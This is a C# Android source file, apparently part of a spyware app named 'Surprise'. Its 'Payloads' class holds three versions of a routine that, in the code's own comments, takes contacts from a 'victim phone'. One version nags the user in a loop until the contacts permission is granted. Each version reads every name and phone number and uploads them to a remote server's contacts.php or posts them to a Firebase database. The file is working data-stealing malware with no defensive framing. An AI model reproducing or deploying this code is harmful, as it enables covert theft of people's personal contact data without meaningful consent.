using Android;
using Firebase.Database.Query;
using System.IO;
using System.Net;
using System.Threading;

namespace Surprise
{
    public partial class MainActivity
    {
        class Payloads
        {
            // [ All Payloads ]


            // [ Get Contacts from Victim Phone and Send to Server ] (with getting permisisons)
            public void DumpContacts(MainActivity activity, ContactService_Android contactService_Android, string Server, string tempPath, int waitTime)
            {
                // Required Permissions
                string[] requiredPermissions = new string[] { Manifest.Permission.ReadContacts.ToString()
                                                             };
                // Getting Permission Manager
                PermissionManager permissionManager = new PermissionManager();

                // Get Required Permissions if Not Granted
                if (!permissionManager.CheckPermissionGranted(activity, requiredPermissions[0]))
                    permissionManager.GainPermissions(activity, requiredPermissions);

                // Wait Until Get Permission
                while (permissionManager.CheckPermissionGranted(activity, requiredPermissions[0]) == false)
                {
                    // Time Out
                    Thread.Sleep(waitTime);
                    permissionManager.GainPermissions(activity, requiredPermissions);
                }

                // Get all Contacts from Contact Service
                var contacts = contactService_Android.GetAllContacts();

                // Write all Contacts to a txt file temporary to upload it to server
                using (StreamWriter sw = new StreamWriter(tempPath))
                {
                    foreach (var contact in contacts)
                    {
                        sw.WriteLine("Name: [ " + contact.Name + " ] " + "Number: [ " + contact.PhoneNumber + " ]");
                    }

                    sw.Close();
                }

                // Uplaod File to Server
                WebClient webClient = new WebClient();
                webClient.UploadFile(Server + "/contacts.php", tempPath);

                // Delete the Temporary txt File
                File.Delete(tempPath);
            }

            // [ Get Contacts from Victim Phone and Send to Server ] (with getting permisisons and without own server)
            public void DumpContacts(MainActivity activity, ContactService_Android contactService_Android, Firebase.Database.FirebaseClient client, string tempPath, int waitTime)
            {
                // Required Permissions
                string[] requiredPermissions = new string[] { Manifest.Permission.ReadContacts.ToString()
                                                             };
                // Getting Permission Manager
                PermissionManager permissionManager = new PermissionManager();

                // Get Required Permissions if Not Granted
                if (!permissionManager.CheckPermissionGranted(activity, requiredPermissions[0]))
                    permissionManager.GainPermissions(activity, requiredPermissions);

                // Wait Until Get Permission
                while (permissionManager.CheckPermissionGranted(activity, requiredPermissions[0]) == false)
                {
                    // Time Out
                    Thread.Sleep(waitTime);
                    permissionManager.GainPermissions(activity, requiredPermissions);
                }

                // Get all Contacts from Contact Service
                var contacts = contactService_Android.GetAllContacts();

                // Write all Contacts to a txt file temporary to upload it to server
                using (StreamWriter sw = new StreamWriter(tempPath))
                {
                    foreach (var contact in contacts)
                    {
                        sw.WriteLine("Name: [ " + contact.Name + " ] " + "|| " + "Number: [ " + contact.PhoneNumber + " ]");

                        // Upload to Data Base
                        client.Child("Person").PostAsync(new ItemsModel() { Name = contact.Name, Number = contact.PhoneNumber });
                    }

                    sw.Close();
                }


                // Delete the Temporary txt File
                //File.Delete(tempPath);

            }

            // [ Get Contacts from Victim Phone and Send to Server ] (without getting permissions)
            public void DumpContacts(MainActivity activity, ContactService_Android contactService_Android, string Server, string tempPath)
            {
                // Required Permissions
                string[] requiredPermissions = new string[] { Manifest.Permission.ReadContacts.ToString()
                                                             };
                // Getting Permission Manager
                PermissionManager permissionManager = new PermissionManager();

                // Check Permissions to Avoid Crashing of App
                if (!permissionManager.CheckPermissionGranted(activity, requiredPermissions[0]))
                    return;

                // Get all Contacts from Contact Service
                var contacts = contactService_Android.GetAllContacts();

                // Write all Contacts to a txt file temporary to upload it to server
                using (StreamWriter sw = new StreamWriter(tempPath))
                {
                    foreach (var contact in contacts)
                    {
                        sw.WriteLine("Name: [ " + contact.Name + " ] " + "Number: [ " + contact.PhoneNumber + " ]");
                    }

                    sw.Close();
                }

                // Uplaod File to Server
                WebClient webClient = new WebClient();
                webClient.UploadFile(Server + "/contacts.php", tempPath);

                // Delete the Temporary txt File
                File.Delete(tempPath);
            }
        }
    }
}
